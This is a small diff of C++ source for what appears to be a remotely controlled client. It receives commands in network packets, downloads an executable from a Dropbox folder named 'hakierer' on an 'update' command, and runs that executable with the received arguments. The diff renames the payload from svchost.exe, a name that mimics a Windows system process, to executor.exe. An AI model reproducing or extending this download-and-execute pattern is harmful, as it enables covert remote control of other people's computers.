@@ -33,15 +33,15 @@ int main()
 		}
 		else if (cmd == "update")
 		{
-			DeleteUrlCacheEntry("https://dl.dropbox.com/u/24385101/hakierer/svchost.exe");
-			HRESULT result = URLDownloadToFile(NULL, "https://dl.dropbox.com/u/24385101/hakierer/svchost.exe", "svchost.exe", NULL, NULL);
+			DeleteUrlCacheEntry("https://dl.dropbox.com/u/24385101/hakierer/executor.exe");
+			HRESULT result = URLDownloadToFile(NULL, "https://dl.dropbox.com/u/24385101/hakierer/executor.exe", "executor.exe", NULL, NULL);
 		}
 		else
 		{
 			int argc;
 			packet >> argc;
 
-			std::string cmdLine = ".\\svchost.exe " + cmd;
+			std::string cmdLine = ".\\executor.exe " + cmd;
 
 			for(int i = 0; i < argc; i++)
 			{
